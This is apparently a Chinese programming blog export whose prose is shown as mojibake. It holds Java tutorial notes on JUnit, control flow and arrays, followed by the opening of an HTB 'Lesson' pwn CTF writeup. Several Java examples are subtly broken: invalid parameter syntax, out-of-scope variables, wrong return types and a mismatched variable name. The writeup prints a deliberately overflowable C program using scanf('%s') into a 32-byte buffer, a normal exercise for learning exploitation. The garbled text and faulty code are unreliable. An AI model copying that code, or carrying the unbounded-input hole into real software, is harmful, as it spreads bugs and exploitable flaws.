å¯¹åŒä¸€åŒ…å†…çš„ç±»å’Œæ‰€æœ‰å­ç±»å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•ã€‚ æ³¨æ„ï¼šä¸èƒ½ä¿®é¥°ç±»ï¼ˆå¤–éƒ¨ç±»ï¼‰ã€‚ è®¿é—®æ§åˆ¶ï¼š ä¿®é¥°ç¬¦ å½“å‰ç±» åŒä¸€åŒ…å†… å­å­™ç±»(åŒä¸€åŒ…) å­å­™ç±»(ä¸åŒåŒ…) å…¶ä»–åŒ… public Y Y Y Y Y protected Y Y Y Y/N N default Y Y Y N N private Y N N N N æ³¨é‡Šå•è¡Œæ³¨é‡Šï¼š 123// æ³¨é‡Š/* æ³¨é‡Š */ å¤šè¡Œæ³¨é‡Šï¼š å¤šè¡Œæ³¨é‡Šä»¥ /*å¼€å§‹ï¼Œä»¥*/ç»“æŸï¼š 1234/* å¤šè¡Œæ³¨é‡Š*/ æ–‡æ¡£æ³¨é‡Š:æ–‡æ¡£æ³¨é‡Šä»¥ /** å¼€å§‹ï¼Œä»¥ */ ç»“æŸ 1234/** * è¿™æ˜¯ä¸€ä¸ªæ–‡æ¡£æ³¨é‡Šç¤ºä¾‹ * å®ƒé€šå¸¸åŒ…å«æœ‰å…³ç±»ã€æ–¹æ³•æˆ–å­—æ®µçš„è¯¦ç»†ä¿¡æ¯ */ æµ‹è¯•JUnit5æ˜¯Javaé¢†åŸŸé‡Œæ ‡å‡†å•å…ƒæµ‹è¯•æ¡†æ¶ã€‚ importï¼š 1234import org.junit.jupiter.api.Test;import org.junit.jupiter.api.BeforeEach;import org.junit.jupiter.api.AfterEach;import static org.junit.jupiter.api.Assertions.*; å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š 1234@Testpublic void exampleTest() &#123; assertEquals(42, 42);&#125; @Testæ˜¯ä¸€ä¸ª æ³¨è§£ï¼ˆannotationï¼‰ï¼Œæ¥è‡ª JUnitï¼ˆæ¯”å¦‚ org.junit.Testï¼‰ã€‚å®ƒå‘Šè¯‰æµ‹è¯•æ¡†æ¶ï¼šâ€œä¸‹é¢è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œè¯·åœ¨æ‰§è¡Œæµ‹è¯•æ—¶è‡ªåŠ¨è¿è¡Œå®ƒâ€ã€‚ åªè¦ç‚¹ IDE é‡Œçš„ â€œRun Testsâ€ï¼Œæµ‹è¯•æ¡†æ¶å°±ä¼šæ‰«ææ‰€æœ‰å¸¦ @Test çš„æ–¹æ³•ï¼Œç„¶åä¸€ä¸ªä¸ªæ‰§è¡Œã€‚ å¸¸ç”¨æ³¨è§£åŒ…æ‹¬ï¼š @Testï¼š æ ‡è®°ä¸€ä¸ªæ–¹æ³•ä¸ºå•å…ƒæµ‹è¯•æ–¹æ³•ã€‚ @BeforeEachï¼š å‰ç½®è®¾ç½®ã€‚åœ¨æ¯ä¸ªæµ‹è¯•æ–¹æ³•è¿è¡Œä¹‹å‰æ‰§è¡Œä¸€æ¬¡ï¼Œç”¨äºåˆå§‹åŒ–æ•°æ®æˆ–ç¯å¢ƒã€‚ @AfterEachï¼š åç½®æ¸…ç†ã€‚åœ¨æ¯ä¸ªæµ‹è¯•æ–¹æ³•è¿è¡Œä¹‹åæ‰§è¡Œä¸€æ¬¡ï¼Œç”¨äºæ¸…ç†èµ„æºã€‚ @ParameterizedTestï¼š å‚æ•°åŒ–æµ‹è¯•ã€‚å…è®¸ä½¿ç”¨ä¸åŒçš„è¾“å…¥æ•°æ®å¤šæ¬¡è¿è¡ŒåŒä¸€ä¸ªæµ‹è¯•æ–¹æ³•ï¼Œå‡å°‘é‡å¤ä»£ç ã€‚ assertEquals(42, 42);æ˜¯ä¸€ä¸ªæ–­è¨€ (Assertions)ï¼Œæ˜¯æµ‹è¯•çš„æ ¸å¿ƒã€‚å®ƒç”¨æ¥éªŒè¯å®é™…è¿è¡Œç»“æœæ˜¯å¦ç¬¦åˆé¢„æœŸã€‚ å¸¸ç”¨æ–­è¨€åŒ…æ‹¬ï¼š ç›¸ç­‰æ€§ä¸ä¸ç­‰æ€§æ–­è¨€ (Equality) assertEquals(expected, actual)ï¼š æ–­è¨€æœŸæœ›å€¼ä¸å®é™…å€¼ç›¸ç­‰ï¼ˆæ¯”è¾ƒå†…å®¹/å€¼ï¼‰ã€‚ assertNotEquals(unexpected, actual)ï¼š æ–­è¨€å®é™…å€¼ä¸ç»™å®šçš„å€¼ä¸ç›¸ç­‰ã€‚ assertArrayEquals(expected, actual)ï¼š æ–­è¨€ä¸¤ä¸ªæ•°ç»„åŒ…å«ç›¸åŒçš„å…ƒç´ åºåˆ—ä¸”é¡ºåºä¸€è‡´ã€‚ çœŸå€¼æ–­è¨€ (Boolean Conditions) assertTrue(condition)ï¼š æ–­è¨€ç»™å®šçš„å¸ƒå°”æ¡ä»¶ä¸º çœŸ (true)ã€‚ assertFalse(condition)ï¼š æ–­è¨€ç»™å®šçš„å¸ƒå°”æ¡ä»¶ä¸º å‡ (false)ã€‚ ç©ºå€¼æ–­è¨€ (Nullity) assertNull(actual)ï¼š æ–­è¨€å®é™…å€¼ä¸º ç©º (null)ã€‚ assertNotNull(actual)ï¼š æ–­è¨€å®é™…å€¼ éç©ºã€‚ å¯¹è±¡èº«ä»½æ–­è¨€ (Identity / Same Reference) assertSame(expected, actual)ï¼š æ–­è¨€æœŸæœ›å¯¹è±¡å’Œå®é™…å¯¹è±¡æ˜¯åŒä¸€ä¸ªå¯¹è±¡å®ä¾‹ï¼ˆå³å¼•ç”¨ç›¸ç­‰ï¼‰ã€‚ assertNotSame(unexpected, actual)ï¼š æ–­è¨€ä¸¤ä¸ªå¯¹è±¡ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡å®ä¾‹ã€‚ å¼‚å¸¸ä¸è¡Œä¸ºæ–­è¨€ (Exceptions and Behavior) assertThrows(Type, executable)ï¼š æ–­è¨€åœ¨æ‰§è¡Œå¯æ‰§è¡Œä»£ç æ—¶ï¼Œä¼šæŠ›å‡ºæŒ‡å®šç±»å‹çš„å¼‚å¸¸ã€‚ assertDoesNotThrow(executable)ï¼š æ–­è¨€åœ¨æ‰§è¡Œä»£ç æ—¶ï¼Œä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ã€‚ assertTimeout(duration, executable)ï¼š æ–­è¨€ä»£ç å—åœ¨æŒ‡å®šçš„æ—¶é—´å†…æ‰§è¡Œå®Œæ¯•ï¼ˆéæŠ¢å å¼ï¼‰ã€‚ assertTimeoutPreemptively(duration, executable)ï¼š æ–­è¨€ä»£ç å—åœ¨æŒ‡å®šæ—¶é—´åç«‹å³è¢«ä¸­æ­¢ï¼ˆæŠ¢å å¼ï¼‰ã€‚ ç»„åˆä¸å¤±è´¥æ–­è¨€ (Grouping and Failure) assertAll(executables...)ï¼š ç»„åˆæ–­è¨€ã€‚å³ä½¿å‰é¢çš„æ–­è¨€å¤±è´¥ï¼Œä¹Ÿä¼šç»§ç»­æ‰§è¡Œæ‰€æœ‰æ–­è¨€ï¼Œç„¶åç»Ÿä¸€æŠ¥å‘Šæ‰€æœ‰å¤±è´¥ã€‚ fail(message)ï¼š å¼ºåˆ¶ä½¿å½“å‰æµ‹è¯•æ–¹æ³•å¤±è´¥ï¼Œå¹¶å¸¦æœ‰ä¸€ä¸ªå¯é€‰çš„æ¶ˆæ¯ã€‚ é™¤æ­¤ä»¥å¤–ï¼ŒJava æµ‹è¯•æ–¹æ³•é€šå¸¸æœ‰å‡ ä¸ªç‰¹ç‚¹ï¼š å¿…é¡»æ˜¯ public è¿™æ ·æµ‹è¯•æ¡†æ¶å¯ä»¥é€šè¿‡åå°„æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ è¿”å›ç±»å‹æ˜¯ void æµ‹è¯•çš„â€œç»“æœâ€ä¸æ˜¯é€šè¿‡è¿”å›å€¼è¡¨ç¤ºçš„ï¼Œè€Œæ˜¯ï¼š ä¸æŠ›å¼‚å¸¸ â†’ è§†ä¸ºæµ‹è¯•é€šè¿‡ æŠ›å‡ºæ–­è¨€å¼‚å¸¸ï¼ˆAssertionErrorï¼‰æˆ–å…¶ä»–å¼‚å¸¸ â†’ è§†ä¸ºæµ‹è¯•å¤±è´¥ æ§åˆ¶ç»“æ„æ§åˆ¶ç»“æ„ä¸€èˆ¬åˆ†ä¸º3ç§ï¼š é¡ºåºç»“æ„ é€‰æ‹©ç»“æ„ è¿­ä»£ç»“æ„ ä»»ä½•å¯è®¡ç®—çš„å‡½æ•°éƒ½å¯ä»¥é€šè¿‡é¡ºåºã€é€‰æ‹©å’Œè¿­ä»£è¿™ä¸‰ç§ç»“æ„è®¡ç®—å‡ºæ¥ï¼ˆå›¾çµå®Œå¤‡æ€§ï¼‰ ã€‚ é€‰æ‹©ç»“æ„if / else12345678int score = 85;if (score &gt;= 90) &#123; System.out.println(&quot;A&quot;);&#125; else if (score &gt;= 80) &#123; System.out.println(&quot;B&quot;);&#125; else &#123; System.out.println(&quot;C&quot;);&#125; ä¸‰å…ƒè¿ç®—ç¬¦ ? :12int x_abs = x &gt;= 0 ? x : -x;// è®¡ç®—ç»å¯¹å€¼ å¦‚æœé—®å·?å‰é¢çš„æ¡ä»¶æ»¡è¶³ï¼Œåˆ™èµ°å†’å·:å‰çš„åˆ†æ”¯ï¼Œåä¹‹åˆ™èµ°å†’å·:åé¢çš„åˆ†æ”¯ã€‚ switchï¼ˆé€‚åˆç¦»æ•£å€¼åˆ†æ”¯ï¼‰æœ€åŸºç¡€çš„å†™æ³•ï¼Œä½¿ç”¨å†’å· : æ¥æ ‡è®°åˆ†æ”¯ã€‚ ä½¿ç”¨ case å€¼: æ¥å®šä¹‰å…¥å£ã€‚ å¿…é¡»ä½¿ç”¨ break;ï¼šæ‰§è¡Œå®Œä»£ç åï¼Œå¿…é¡»æ˜¾å¼è°ƒç”¨ break è¯­å¥æ¥è·³å‡º switch å— ã€‚ ç©¿é€ç°è±¡ (Fall-through)ï¼šå¦‚æœå¿˜è®°å†™ breakï¼Œç¨‹åºä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œä¸‹ä¸€ä¸ª case çš„ä»£ç ï¼Œè¿™é€šå¸¸ä¼šå¯¼è‡´é€»è¾‘é”™è¯¯ï¼ˆä½†ä¹Ÿå¯èƒ½è¢«æ•…æ„åˆ©ç”¨ï¼‰ ã€‚ 123456789switch (monat) &#123; case 1: tage = 31; break; // å¿…é¡»æœ‰ break case 2: tage = 28; break; // ...&#125; è€Œåœ¨Java 14ä¸­å¼•å…¥äº†ä¸€ç§æ–°çš„æ”¹è¿›å†™æ³•ï¼ˆéå¸¸å¥½ç”¨ï¼‰ï¼š ä½¿ç”¨ case å€¼ -&gt; è¯­å¥; çš„å½¢å¼ã€‚ æ— éœ€ breakï¼šæ‰§è¡Œå®Œç®­å¤´åçš„è¯­å¥ä¼šè‡ªåŠ¨è·³å‡º switchï¼Œä¸ä¼šå‘ç”Ÿç©¿é€ï¼Œé¿å…äº†ä¼ ç»Ÿå†™æ³•ä¸­æœ€å®¹æ˜“å‡ºç°çš„é”™è¯¯ ã€‚ æ”¯æŒå¤šå€¼åŒ¹é…ï¼šå¯ä»¥åœ¨ä¸€ä¸ª case ä¸­ç”¨é€—å·åˆ†éš”å¤šä¸ªå€¼ï¼Œä¾‹å¦‚ case 1, 3, 5 -&gt; ... ã€‚ ä¾‹å­ï¼š 12345678910111213141516int tageImMonat(int monat) &#123; int tage = 0; switch (monat) &#123; case 1, 3, 5, 7, 8, 10, 12 -&gt; tage = 31; case 2 -&gt; tage = 28; case 4, 6, 9, 11 -&gt; tage = 30; default -&gt; &#123; System.out.println(&quot;Der &quot; + month + &quot;. ist kein gÃ¼ltiger Monat!&quot;); yield &quot;ERROR&quot;; &#125; &#125; return tage;&#125; switch ä¸ä»…å¯ä»¥æ‰§è¡ŒåŠ¨ä½œï¼Œè¿˜å¯ä»¥ç›´æ¥è¿”å›å€¼ï¼ˆä½œä¸ºè¡¨è¾¾å¼èµ‹å€¼ç»™å˜é‡ï¼‰ ã€‚ å†™æ³• Aï¼ˆä½¿ç”¨ç®­å¤´ï¼‰ï¼š ç›´æ¥è¿”å›ç®­å¤´åçš„å€¼ã€‚ 12345String season = switch (month) &#123; case 12, 1, 2 -&gt; &quot;winter&quot;; case 3, 4, 5 -&gt; &quot;spring&quot;; // ...&#125;; å†™æ³• Bï¼ˆä½¿ç”¨å†’å· + yieldï¼‰ï¼š å¦‚æœåœ¨è¡¨è¾¾å¼ä¸­ä»ä½¿ç”¨ä¼ ç»Ÿçš„å†’å·å†™æ³•ï¼ˆä¾‹å¦‚ä¸ºäº†æ‰§è¡Œä»£ç å—ï¼‰ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ yield å…³é”®å­—æ¥è¿”å›å€¼ ã€‚ 12345String season = switch (month) &#123; case 12, 1, 2: yield &quot;Winter&quot;; // ä½¿ç”¨ yield è¿”å› // ...&#125;; è¿­ä»£ç»“æ„for123for (int i = 0; i &lt; n; i++) &#123; System.out.println(i);&#125; è¿™ç§å†™æ³•iä¼šéå†[0,n)çš„æ‰€æœ‰æ•°ã€‚ å¦‚æœéœ€è¦éå†æ—¶ä¹Ÿéœ€è¦è€ƒè™‘nçš„æƒ…å†µï¼Œå¯ä»¥å†™æˆ 123for (int i = 0; i &lt;= n; i++) &#123; System.out.println(i);&#125; ä¼šæ¯”è¾ƒç›´è§‚ã€‚ 1234int[] arr = &#123;1,2,3&#125;; //å®šä¹‰æ•°ç»„for (int v : arr) &#123; System.out.println(v);&#125; while12345int i = 3;while (i &gt; 0) &#123; System.out.println(i); i--;&#125; å…ˆåˆ¤æ–­æ¡ä»¶ï¼Œè‹¥ä¸ºçœŸåˆ™æ‰§è¡Œå¾ªç¯ä½“ï¼Œæ‰§è¡Œå®Œåå†æ¬¡åˆ¤æ–­ï¼›è‹¥ä¸ºå‡åˆ™è·³è¿‡ ã€‚ å¯ä»¥ç”¨breakæ¥é€€å‡ºå½“å‰å¾ªç¯ ä¹Ÿå¯ä»¥ç”¨continueè·³è¿‡å½“å‰å¾ªç¯çš„å‰©ä½™éƒ¨åˆ†å¹¶ç›´æ¥å¼€å§‹ä¸‹ä¸€è½®å¾ªç¯ do-while1234int x = 0;do &#123; System.out.println(&quot;æ‰§è¡Œä¸€æ¬¡&quot;);&#125; while (x &gt; 0); è‡³å°‘æ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“ï¼Œå› ä¸ºæ¡ä»¶æ£€æŸ¥åœ¨æœ«å°¾ ã€‚ æ•°ç»„ ArrayåŸºç¡€å®šä¹‰ï¼š æ•°ç»„å°†åŒç±»å‹æ•°æ®è¿ç»­å­˜å‚¨ï¼Œé€šè¿‡ç´¢å¼•ï¼ˆIndexï¼‰è®¿é—®ï¼Œç´¢å¼•ä»0å¼€å§‹ ã€‚ å£°æ˜/åˆ›å»º/åˆå§‹åŒ–ï¼š 12345678// å£°æ˜type [] name;type name [];// åˆ›å»º/åˆå§‹åŒ–new type [n];type [] name = &#123;...&#125; ä¾‹å­ï¼š 12345int [] vector;int [] vector = &#123;1,2,3,4&#125;a = new int[6]; å¼•ç”¨è¯­ä¹‰ï¼š æ•°ç»„å˜é‡ï¼ˆå¦‚ aï¼‰å­˜å‚¨çš„ä¸æ˜¯æ•°ç»„æœ¬èº«ï¼Œè€Œæ˜¯ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„å¼•ç”¨ï¼ˆReferenceï¼‰ ã€‚ åˆ«åç°è±¡ (Aliasing)ï¼š æ‰§è¡Œ int[] b = a; åï¼Œb å’Œ a æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ã€‚ä¿®æ”¹ b[i] ä¼šå¯¼è‡´ a[i] ä¹Ÿå‘ç”Ÿå˜åŒ– ã€‚ æ“ä½œé•¿åº¦ï¼š name.length è·å–æ•°ç»„å…ƒç´ ä¸ªæ•° ã€‚ ä¾‹å­ï¼š 12int [] vector = &#123;1,2,3,4&#125;;// vector.length = 4 è¶Šç•Œï¼š è®¿é—®èŒƒå›´ä¹‹å¤–çš„ç´¢å¼•ä¼šè§¦å‘ ArrayIndexOutOfBoundsException ã€‚ éå† (Iteration)ï¼š é€šå¸¸å†™æ³•ï¼š 123for (int i = 0; i &lt; a.length ; i++)&#123; a[i]...;&#125; 123for(int i: a)&#123;&#125; ä¹Ÿå¯ä»¥ç”¨whileï¼š 12345int i = 1;while(i &lt; a.length)&#123; a[i]...; i++;&#125; éå†æ•°ç»„çš„å€¼ï¼š 1234int idx = 0;for (int value : a) &#123; b[idx++] = value;&#125; æ•°ç»„å¤åˆ¶ï¼š ç›´æ¥èµ‹å€¼ (b=a) åªæ˜¯å¤åˆ¶å¼•ç”¨ã€‚ è‹¥è¦æ·±æ‹·è´ï¼ˆçœŸæ­£å¤åˆ¶å†…å®¹ï¼‰ï¼Œå¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„å¹¶å¾ªç¯èµ‹å€¼ b[i] = a[i] ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ java.lang.System.arraycopy(...) ã€‚ 12345int [] a = &#123;1,2,3,4&#125;;int b [] = new int[4];for (int i=0 ; i &lt; a.length ; i++)&#123; b[i] = a[i];&#125; ä¾‹å­æŸ¥æ‰¾å…ƒç´ æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ 12345678boolean has (long[a], long x)&#123; for (int i=0; i&lt;a.length;i++)&#123; if (a[i]==x)&#123; break; &#125; &#125; return i != a.length;&#125; å¦‚æœå­˜åœ¨ï¼ŒæŸ¥æ‰¾indexï¼š 12345678boolean has (long[a], long x)&#123; for (int i=0; i&lt;a.length;i++)&#123; if (a[i]==x)&#123; break; &#125; &#125; return i;&#125; æ’åºBubble Sortï¼š 123456789101112public static void bubbleSort(int[] fish) &#123; int zwischen; for(int round = 0; round &lt; fish.length ; round++)&#123; for (int i=0; i &lt; fish.length-1 - round ; i++)&#123; if (fish[i] &gt; fish[i+1])&#123; zwischen = fish[i]; fish[i] = fish[i+1]; fish[i+1] = zwischen; &#125; &#125; &#125; &#125; å¤šç»´æ•°ç»„javaä»…ç›´æ¥æ”¯æŒä¸€ç»´æ•°ç»„ã€‚äºŒç»´æ•°ç»„å®é™…ä¸Šæ˜¯å…ƒç´ ç»´æ•°ç»„çš„ä¸€ä¸ªæ•°ç»„ã€‚ 1new int[][] twoDimArray; 1234A = new int [n][m] A.length // = nA[0].length // = m å½“ç„¶ï¼ŒäºŒç»´æ•°ç»„ä¸ä¸€å®šæ¯è¡Œçš„é•¿åº¦éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚è¯´ 1new int[][] &#123;&#123;1, 3&#125;, &#123;25&#125;, &#123;7, 4, 6, 9&#125;&#125; ä¹Ÿæ˜¯åˆæ³•çš„ã€‚ ä¾‹å­ï¼ˆå‘é‡åŠ æ³•ï¼‰ï¼š ï¼ˆå‡è®¾aï¼Œbçš„é•¿åº¦ä¸€æ ·ä¸”ä¸ç­‰äº0ï¼‰ 1234567public static int[] addVector(int[] a, int[] b)&#123; int [] c = new int[a.length]; for (int i=0; i&lt;a.length;i++)&#123; c[i] = a[i]+b[i]; &#125; return c;&#125; ä¾‹å­ï¼ˆç‚¹ç§¯ï¼‰ï¼š ï¼ˆå‡è®¾aï¼Œbçš„é•¿åº¦ä¸€æ ·ä¸”ä¸ç­‰äº0ï¼‰ 1234567public static int scalarProduct(int [] a, int [] b)&#123; int result = 0; for (int i=0; i&lt;a.length;i++)&#123; result += a[i]*b[i]; &#125; return result;&#125; ä¾‹å­ï¼ˆçŸ©é˜µä¹˜æ³•ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536public static int[][] matrixMult(int[][] matrixA, int[][] matrixB) &#123; // å…ˆæ£€æŸ¥è¾“å…¥æ˜¯å¦åˆè§„ int aRow = matrixA.length; int bRow = matrixB.length; int aCol = matrixA[0].length; int bCol = matrixB[0].length; if (aCol != bRow)&#123; return null; &#125; for (int idx = 0; idx &lt; aRow ; idx++)&#123; if (aCol != matrixA[idx].length)&#123; return null; &#125; &#125; for (int idx = 0; idx &lt; bRow ; idx++)&#123; if (bCol != matrixB[idx].length)&#123; return null; &#125; &#125; // çœŸæ­£å¼€å§‹è®¡ç®— int[][] result = new int[aRow][bCol]; for (int i=0; i &lt; aRow ; i++)&#123; for (int j = 0; j &lt; bCol ; j++)&#123; for (int k=0 ; k &lt; aCol ; k++)&#123; result[i][j] += matrixA[i][k] * matrixB[k][j]; &#125; &#125; &#125; return result;&#125;","categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://archer-baiyi.github.io/tags/Java/"}]},{"title":"HTB Lesson Writeup","slug":"CTF/Pwn/HTB-Lesson-Writeup","date":"2025-08-21T10:49:18.000Z","updated":"2025-08-21T11:08:14.294Z","comments":true,"path":"2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/","permalink":"https://archer-baiyi.github.io/2025/08/21/CTF/Pwn/HTB-Lesson-Writeup/","excerpt":"ä¸€äº›å…³äºPwnçš„åŸºç¡€çŸ¥è¯†ã€‚ï¼ˆåŒ…æ‹¬ä¸€äº›pwnå¸¸ç”¨çš„Linuxå‘½ä»¤ï¼‰","text":"é¢˜ç›® 123456789101112131415161718192021#include &lt;stdio.h&gt;void under_construction()&#123; printf(&quot;This is under development\\n&quot;);&#125;void print_msg(char *user)&#123; char formatter[0x20]; strncpy(formatter, user, 5); for (size_t i = 0; i &lt; 5; i++) formatter[i] = tolower(formatter[i]); printf(strncmp(formatter, &quot;admin&quot;, 5) == 0 ? &quot;\\nWelcome admin!\\n\\n&quot; : &quot;\\nWelcome user!\\n\\n&quot;); &#125;int main(int argc, char **argv)&#123; char name[0x20] = &#123;0&#125;; unsigned long x, y; printf(&quot;Enter your name: &quot;); scanf(&quot;%s&quot;, name); print_msg(name); return 0;&#125; é¢˜è§£ç¬¬ä¸€é¢˜123456789101112This is a quick lesson to get started with the basics.â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Run &#x27;file ./main&#x27; to get some information about the binary. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x1:Is this a &#x27;32-bit&#x27; or &#x27;64-bit&#x27; ELF? (e.g. 1337-bit)&gt;&gt; 12â””â”€$ file ./main./main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=da663acb70f9fa157a543a6c4affd05e53fbcb07, for GNU/Linux 3.2.0, not stripped æ‰€ä»¥æ˜¯64ä½çš„ã€‚ 1234567&gt;&gt; 64-bitâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬äºŒé¢˜123456789101112â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Run &#x27;gdb ./main&#x27; to open the binary in the debugger, then â—‰â—‰ run &#x27;checksec&#x27; to see the protections. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x2:Which of these 3 protections are enabled (Canary, NX, PIE)?&gt;&gt; 1234567891011â””â”€$ checksec ./main Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: &#x27;./glibc/&#x27; SHSTK: Enabled IBT: Enabled Stripped: No 1234567&gt;&gt; NXâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬ä¸‰é¢˜123456789101112â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Pay attention to the &#x27;void print_msg(char *user)&#x27; â—‰â—‰ and the &#x27;strncmp(arg1, arg2, n_bytes)&#x27;. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x3:What do you need to enter so the message &#x27;Welcome admin!&#x27; is printed?&gt;&gt; æŸ¥çœ‹æºä»£ç å³å¯å‘ç°ï¼š 1printf(strncmp(formatter, &quot;admin&quot;, 5) == 0 ? &quot;\\nWelcome admin!\\n\\n&quot; : &quot;\\nWelcome user!\\n\\n&quot;); æ‰€ä»¥ 1234567&gt;&gt; adminâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬å››é¢˜1234567891011â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: This is the buffer --&gt; char name[0x20] = &#123;0&#125;; â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x4:What is the size of the &#x27;name&#x27; buffer (in hex or decimal)?&gt;&gt; çœ‹æºç çš„è¿™é‡Œï¼š 1char name[0x20] = &#123;0&#125;; 1234567&gt;&gt; 0x20â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  